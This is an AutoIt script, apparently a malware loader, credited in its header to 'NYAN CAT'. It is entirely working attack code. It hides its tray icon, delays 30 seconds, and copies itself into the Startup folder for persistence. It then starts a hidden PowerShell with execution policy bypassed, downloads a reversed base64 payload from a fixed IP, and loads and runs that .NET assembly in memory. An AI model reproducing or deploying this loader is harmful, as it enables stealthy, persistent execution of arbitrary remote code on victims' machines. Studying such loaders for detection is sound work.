#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         NYAN CAT

 Script Function:
	AutiIt PowerShell Loader
	[*]Download payload as reversed base64
	[*]Run powershell command to load it in memory

#ce ----------------------------------------------------------------------------
#NoTrayIcon


For $i = 30 To 1 Step -1
    Sleep(1000)
 Next

If Not FileExists(@StartupDir & "/" & "nyan.exe") Then
  FileCopy(@ScriptFullPath, @StartupDir, 1)
EndIf

RunWait("cmd /c start /b powershell -noexit -exec bypass -window 1 " & _
"$web = New-Object System.Net.WebClient;" & _
"$string = $web.Downloadstring('http://192.168.1.196/');" & _
"$assembly = [AppDomain]::CurrentDomain.Load([Convert]::Frombase64String(-join $string[-1..-$string.Length]));" & _
"$methodInfo = $assembly.EntryPoint; $create = $assembly.CreateInstance($methodInfo.Name);" & _
"$methodInfo.Invoke($create,$null) & exit", @SystemDir, @SW_HIDE)